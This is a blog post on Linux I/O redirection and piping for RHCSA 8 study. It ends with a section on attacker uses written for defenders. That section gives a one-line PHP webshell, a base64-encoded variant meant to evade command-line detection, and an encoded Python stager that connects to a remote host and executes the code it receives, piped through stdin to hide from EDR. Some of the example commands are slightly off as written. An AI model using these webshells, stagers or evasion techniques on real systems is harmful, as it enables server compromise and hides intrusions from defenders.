---
title: "Road to RHCSA 8 - I/O Redirection, Piping, and Their Evil Uses"
date: 2020-02-29T15:08:25-06:00
draft: false
tags: 
    - RedHat
    - RHCSA
    - Linux
    - certification
    - Redirection
    - Input
    - Output
    - Piping
    - Python
    - Base64
    - Bash
---

Bourne-compatible Unix shells (`bash`, `sh`, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I/O redirection to stump defenders. If you already know about I/O redirection and you're just here for the security stuff, [jump forward here](#-Evil-Uses-of-Redirection-and-Piping).

## Basics of I/O Redirection

### In and Out Again

From the moment you begin interacting with Linux systems you use the standard forms of input and output- `stdin` and `stdout`. The `stdin` stream usually comes from the keyboard and represents what you type into the command-line interface to interact with Linux. The `stdout` stream is the opposite, text that echoes to the console outputting from programs. Consider this command: 

```bash
$ echo "Hello World"
```

In this case, the `stdin` stream is provided by reading `"Hello World"` and the `stdout` stream is the display of what is echoed to the console. Millions of Linux devices across the world could work with just displaying things to the console, but they work a lot better making use of redirection. The most fundamental use of redirection comes from the `>` character. This will place the output of a program into a file. For example, I use this command frequently when analyzing malware:

```bash
$ strings malware.bin > malware.strings.txt
```

This command takes the output of `strings` and redirects it into the file `malware.strings.txt` so I can read it later at my convenience. Keep in mind that `>` operator will overwrite files without warning. If I execute another command to redirect output into `malware.strings.txt` it will be overwritten. If I want to append text to the same file, I have to use `>>` instead. When I use it, the commands look something like this: 

```bash
$ strings -eL malware.bin >> malware.strings.txt
```

In this case, the output of `strings` is appended to my previous text file.

An operation that's a bit less common is input redirection using `<` and `<<`. In these cases, you can use the contents of files as the `stdin` stream. In the first example, `sort` will take `/etc/passwd` as `stdin` and provide the normal console output:

```bash
$ sort < /etc/passwd
```

In the case of `<<` you can specify for the shell to read until it reaches a specific delimiter:

```bash
$ wc -m <<EOF
> thing
> thing
> EOF
12
```

That last one (`<<`) is much more useful in script form than on the command line.

### Everyone Makes Errors

The third I/O stream is `stderr`. Imagine if `stdout` received only diagnostic and error information, and that's the simplification of this stream. You can use `2>` to output this stream to a file, if desired. In this case, I attempt to copy a file into a folder that I shouldn't without root privileges:

```bash
$ touch ~/delete-me.txt
$ cp ~/delete-me.txt /etc/ 2> copy-errors.txt
```

If desired, you can also prevent any errors from showing on the console. You can do this by using a **device file** named `/dev/null`:

```bash
$ touch ~/delete-me.txt
$ cp ~/delete-me.txt /etc/ 2> /dev/null
```

### That's Not Lead Piping

Alongside output redirection, you'll likely use piping frequently in Linux. A pipe is represented by `|` and will let you directly use the output from one command as the `stdin` stream of another. Consider this command:

```bash
$ strings malware.bin | less
```

The command will take the output from `strings` and let me immediately inspect it with `less`. This sort of action is commonly used to scroll through many lines of output without it rushing by in the console. This can also be used numerous times in a row:

```bash
$ cat ~/wordlist.txt | uniq | sort > sorted-dedup-list.txt
```

In this case, I piped the output of `cat` into `uniq` to remove duplicates, and that output was further `sort`ed and redirected into a file.

### File Descriptors (nothing clever)

As you dive deeper into Linux internals you'll eventually encounter **file descriptors**. These structures are handles to files used by a program when they are opened. If you want, on Linux systems you can check out file descriptors for a process under `/proc/[pid]/fd`. For processes you typically interact with, there are three guaranteed file descriptors open: 0, 1, and 2. These correspond to `stdin`, `stdout`, and `stderr`, respectively. This is the reason you can manipulate `stderr` with `2>`. Due to this, you can also manipulate `stdin` and `stdout` with `0<`, `1>`, and `1>>`. 

## Evil Uses of Redirection and Piping

Adversaries can use redirection effectively during exploitation. Let's imagine a scenario where an adversary exploits a web server and can issue commands. They can't yet upload files, but they can manipulate whatever they want in text form. We may see something like this during exploitation:

```bash
$ sh -c echo "<?php @eval($_POST['password']);?>" > china-chopper.php
```

This command creates a webshell (without uploading a file) an adversary can use to issue further commands in an easier format. We can easily write an endpoint-based detection for this by looking for command lines including `echo`, `@eval($_POST`, and `>`.

Adversaries can make this more difficult by using `base64` to obscure what they write into a file:

```
$ echo "<?php @eval($_POST['password']);?>" | base64
PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo=

$ sh -c echo PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo= | base64 -d > china-chopper.php
```
This creation of `china-chopper.php` achieves the same result but evades command-line based detections of the webshell contents.

In another example, let's look at an Empire Python agent:

```python
python -c "import base64,sys;exec(base64.b64decode(aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjEwLjEwJyw4NDQzKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==)"
```

If we examine this process with tools like EDR, we'll see the malicious Python code in the command line arguments for the process. We can easily write a detection for suspicious Python command line value `exec(base64.b64decode(`. Adversaries can bypass this using piping again:

```bash
sh -c echo aW1wb3J0IGJhc2U2NCxzeXM7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGFXMXdiM0owSUhOdlkydGxkQ3h6ZEhKMVkzUXNkR2x0WlFwbWIzSWdlQ0JwYmlCeVlXNW5aU2d4TUNrNkNnbDBjbms2Q2drSmN6MXpiMk5yWlhRdWMyOWphMlYwS0RJc2MyOWphMlYwTGxOUFEwdGZVMVJTUlVGTktRb0pDWE11WTI5dWJtVmpkQ2dvSnpFd0xqRXdMakV3TGpFd0p5dzRORFF6S1NrS0NRbGljbVZoYXdvSlpYaGpaWEIwT2dvSkNYUnBiV1V1YzJ4bFpYQW9OU2tLYkQxemRISjFZM1F1ZFc1d1lXTnJLQ2MrU1Njc2N5NXlaV04yS0RRcEtWc3dYUXBrUFhNdWNtVmpkaWhzS1FwM2FHbHNaU0JzWlc0b1pDazhiRG9LQ1dRclBYTXVjbVZqZGloc0xXeGxiaWhrS1NrS1pYaGxZeWhrTEhzbmN5YzZjMzBwQ2c9PSk= | base64 -d | python
```

This Python execution is much harder to investigate using EDR and similar tools. In this case, an adversary can hide their command line options using more `base64` encoding and use piping to pass the code as input. When we investigate the `python` process in EDR, there will be no command lines showing the contents of the executed script. Instead, the process has read the script it needs to execute from `stdin`, which likely won't be captured by tools. Best of all, this is functionally the same as the previous command.

## Improving Security Tools

In my adventures so far with security tools it seems that `stdin` and `stdout` is sometimes a blind spot, especially when piping is used. One of the better ways to improve tools in the next few years would be adding the ability to inspect these streams where possible.

For those of you joining me on the road to RHCSA 8, good luck when studying!

### References
- [stdin manpage](http://man7.org/linux/man-pages/man3/stdin.3.html)